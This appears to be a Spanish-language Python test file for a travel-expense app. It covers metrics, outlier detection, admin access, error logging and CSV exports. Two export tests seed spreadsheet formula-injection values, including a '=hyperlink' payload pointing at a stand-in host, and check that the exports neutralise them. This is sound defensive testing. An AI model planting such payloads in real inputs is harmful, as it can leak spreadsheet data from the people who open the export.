"""Cada métrica contra un conjunto conocido: si una definición cambia, una cifra cambia y la prueba falla."""
import json

from app import db
from app.servicios import inteligencia, metricas

PROYECTO = 901   # proyecto exclusivo de estas pruebas: aísla las cifras de lo que carguen las demás


def _gasto(estado, total, categoria="comidas", moneda="USD", proyecto=PROYECTO, **extra):
    if not db.uno("select id from proyectos where id=:i", i=proyecto):   # las claves foráneas exigen que el proyecto exista
        db.insertar("proyectos", id=proyecto, nombre=f"Proyecto de pruebas {proyecto}", moneda="USD")
    return db.insertar("gastos", proyecto_id=proyecto, viajero_id=1, comercio="Prueba", fecha="2026-11-01", categoria=categoria,
                       total=total, moneda=moneda, total_usd=total, estado=estado, confianza=0.95, creado=db.ahora(), **extra)


def test_metricas_de_gastos_sobre_un_conjunto_conocido():
    leido = {"comercio": "Prueba", "fecha": "2026-11-01", "categoria": "comidas", "total": 10.0, "moneda": "USD"}
    _gasto("aprobado_auto", 10.0, extraido=json.dumps(leido))
    _gasto("aprobado_auto", 20.0, extraido=json.dumps({**leido, "total": 20.0}))
    _gasto("aprobado", 35.0, extraido=json.dumps({**leido, "total": 53.0}), motivos=json.dumps(["no_cuadra"]))   # se corrigió el total
    _gasto("revision", 99.0, motivos=json.dumps(["duplicado", "duplicado"]))
    m = metricas.gastos({"proyecto_id": PROYECTO})
    assert m["recibidos"] == 4 and m["tasa_sin_intervencion"] == 50 and m["pendientes"] == 1
    assert m["real_total"] == 65.0                                   # el que espera revisión no cuenta como gasto real
    assert m["correccion_por_campo"] == [("total", 1)] and m["gastos_evaluados"] == 3
    assert m["tasa_correccion"] == round(100 * 1 / (3 * len(inteligencia.CAMPOS_COMPARADOS)))
    assert dict(m["motivos"])["Posible duplicado"] == 1              # un gasto cuenta una vez por motivo
    assert metricas.valor("gasto_real", {"proyecto_id": PROYECTO})["valor"] == 65.0
    assert metricas.gastos({"proyecto_id": PROYECTO, "hasta": "2020-01-01"})["recibidos"] == 0


def test_importe_atipico_usa_mediana_y_no_opina_con_pocos_datos():
    for total in (20, 22, 19, 21):
        _gasto("aprobado", total, categoria="peajes", moneda="XTS", proyecto=902)
    assert inteligencia.es_atipico("peajes", "XTS", 24) is None
    assert "atípico" in inteligencia.es_atipico("peajes", "XTS", 210)
    assert inteligencia.es_atipico("peajes", "ZZZ", 210) is None    # sin historia en esa moneda


def test_consola_y_api(cliente, piloto):
    for pestana in ("viajes", "gastos", "busquedas", "modelo", "cupos", "auditoria", "calidad"):
        assert cliente.get(f"/admin/monitoreo?pestana={pestana}&proyecto_id=1&desde=2026-01-01").status_code == 200, pestana
    assert piloto.get("/admin/monitoreo").status_code == 403
    assert piloto.get("/api/metricas").status_code == 403
    assert {m["nombre"] for m in cliente.get("/api/metricas").json()} == set(metricas.CATALOGO)
    assert cliente.get(f"/api/metricas?nombre=pendientes_revision&proyecto_id={PROYECTO}").json()["valor"] == 1
    assert cliente.get("/api/metricas?nombre=inventada").status_code == 404
    csv = cliente.get(f"/admin/monitoreo/exportar.csv?vista=v_h_gasto&proyecto_id={PROYECTO}")
    assert csv.status_code == 200 and "total_usd" in csv.text.splitlines()[0] and len(csv.text.splitlines()) == 5
    assert cliente.get("/admin/monitoreo/exportar.csv?vista=usuarios").status_code == 404   # solo las vistas publicadas


def test_calidad_de_datos_en_cero():
    assert all(p["casos"] == 0 for p in metricas.calidad_de_datos() if "sesiones" not in p["prueba"].lower())


def test_un_error_queda_registrado_con_identificador(cliente, monkeypatch):
    def falla(*_):
        raise RuntimeError("fallo provocado")
    monkeypatch.setattr(metricas, "valor", falla)
    r = cliente.get("/api/metricas?nombre=gasto_real")
    assert r.status_code == 500 and r.json()["peticion"] == r.headers["X-Peticion"]
    fila = db.uno("select * from errores where peticion=:p", p=r.json()["peticion"])
    assert fila["tipo"] == "RuntimeError" and fila["ruta"] == "/api/metricas" and fila["usuario_id"]


def test_cada_vista_publicada_se_puede_exportar(cliente):
    """Toda vista analítica nueva necesita su campo de fecha para los filtros; si falta, la descarga falla."""
    from datos.semilla import VISTAS
    for vista in VISTAS:
        r = cliente.get(f"/admin/monitoreo/exportar.csv?vista={vista}&desde=2026-01-01")
        assert r.status_code == 200, vista


def _celdas(texto: str) -> list[list[str]]:
    import csv
    import io
    return list(csv.reader(io.StringIO(texto.removeprefix("\ufeff"))))


def test_las_exportaciones_neutralizan_formulas_que_alguien_sin_cuenta_puede_sembrar(anonimo, cliente):
    """El correo de un intento de ingreso fallido llega a la bitácora; si empieza por «=», la hoja de cálculo lo ejecutaría."""
    anonimo.post("/entrar", data={"correo": '=hyperlink("http://x.example/?"&a1,"abrir")', "clave": "x"})
    for ruta in ("/admin/monitoreo/exportar.csv?vista=v_h_evento", "/admin/kpis/exportar.csv?que=personas",
                 "/admin/kpis/exportar.csv?que=kpis"):
        r = cliente.get(ruta)
        assert r.status_code == 200 and r.text.startswith("\ufeff"), ruta
        celdas = [c for fila in _celdas(r.text) for c in fila]
        assert not [c for c in celdas if c[:1] in ("=", "+", "@", "\t", "\r")], ruta
    eventos = _celdas(cliente.get("/admin/monitoreo/exportar.csv?vista=v_h_evento").text)
    assert any(c.startswith("'=hyperlink") for fila in eventos for c in fila)


def test_el_csv_del_proyecto_deja_vacias_las_celdas_vacias_y_dice_quien_viaja(cliente):
    proyecto = 905   # proyecto propio: no cambia las cifras de los demás
    if not db.uno("select id from proyectos where id=:i", i=proyecto):
        db.insertar("proyectos", id=proyecto, nombre="Proyecto de exportación", moneda="USD")
    db.insertar("gastos", proyecto_id=proyecto, viajero_id=1, comercio="=1+1", estado="revision", creado=db.ahora())
    r = cliente.get(f"/proyectos/{proyecto}/exportar.csv")
    assert r.status_code == 200 and r.text.startswith("\ufeff")   # con BOM, la hoja de cálculo lee bien las tildes
    encabezado, fila = _celdas(r.text)
    datos = dict(zip(encabezado, fila, strict=True))
    assert datos["comercio"] == "'=1+1" and datos["metodo_pago"] == "" and datos["fecha"] == ""
    assert datos["viajero"] == db.uno("select nombre from viajeros where id=1")["nombre"] and datos["viaje"] == ""
